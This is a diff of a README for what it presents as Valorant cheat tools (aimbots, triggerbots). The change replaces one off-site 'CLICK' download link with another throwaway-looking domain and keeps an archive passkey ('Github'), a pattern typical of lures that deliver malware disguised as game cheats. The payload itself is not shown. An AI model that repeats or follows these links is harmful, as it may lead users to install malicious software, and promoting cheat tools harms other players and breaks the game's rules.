@@ -9,7 +9,7 @@ Valorant tools based on open‑source projects — color aimbots, internal cheat
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -92,7 +92,7 @@ Archive passkey: `Github`
 
 ## 🔧 Installation / How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 
 2. Choose your tool:
    - **For triggerbots** — install AutoHotkey v1, run the `.ahk` script [citation:3][citation:10]
